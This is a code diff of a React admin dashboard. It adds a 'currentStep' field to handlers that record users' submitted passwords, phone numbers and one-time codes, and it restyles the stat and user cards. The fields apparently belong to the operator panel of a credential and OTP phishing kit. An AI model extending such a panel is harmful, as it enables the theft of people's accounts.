@@ -416,7 +416,8 @@ const copyField = async (field, value) => {
 
         return {
           ...user,
-        wrongPassword: data.wrongPassword
+        wrongPassword: data.wrongPassword,
+        currentStep: data.currentStep
         };
 
       }
@@ -454,7 +455,8 @@ const handlePhoneSubmitted = (data) => {
 
         return {
           ...user,
-        phoneNumber: data.phoneNumber
+        phoneNumber: data.phoneNumber,
+        currentStep: data.currentStep
         };
 
       }
@@ -487,7 +489,8 @@ const handlePhoneOtpSubmitted = (data) => {
 
         return {
           ...user,
-        phoneOtp: data.phoneOtp
+        phoneOtp: data.phoneOtp,
+        currentStep: data.currentStep
         };
 
       }
@@ -827,7 +830,7 @@ const handlePhoneOtp2Submitted = (data) => {
       </div>
 
 
-      <div style={styles.stats}>
+      <div style={styles.stats} className="stats">
 
         <div style={styles.statCard}>
 
@@ -889,8 +892,8 @@ const handlePhoneOtp2Submitted = (data) => {
 
             <div
               key={user._id}
-              style={styles.userCard}
-              className="use-car"
+              // style={styles.userCard}
+              className="use-car ol"
             >
 
               {/* ======================
@@ -1515,19 +1518,13 @@ const styles = {
     // border: "1px solid #1d4f91"
   },
 
-  stats: {
-    display: "flex",
-    padding: "0px 100px",
-    gap: "18px",
-    marginBottom: "25px",
-    flexWrap: "wrap"
-  },
+
 
   statCard: {
     background: "#1C1F26",
     border: "1px solid #243756",
     borderRadius: "12px",
-    padding: "20px 30px",
+    padding: "10px 20px",
     minWidth: "80px",
     textAlign: "center",
     boxShadow: "0 4px 14px rgba(0, 0, 0, 0.25)"
@@ -1554,14 +1551,6 @@ const styles = {
 
 
 
-  userCard: {
-    background: "#1C1F26",
-    border: "1px solid #243756",
-    borderRadius: "14px",
-    padding: "22px",
-    boxSizing: "border-box",
-    boxShadow: "0 4px 14px rgba(0, 0, 0, 0.25)"
-  },
 
   userHeader: {
     display: "flex",
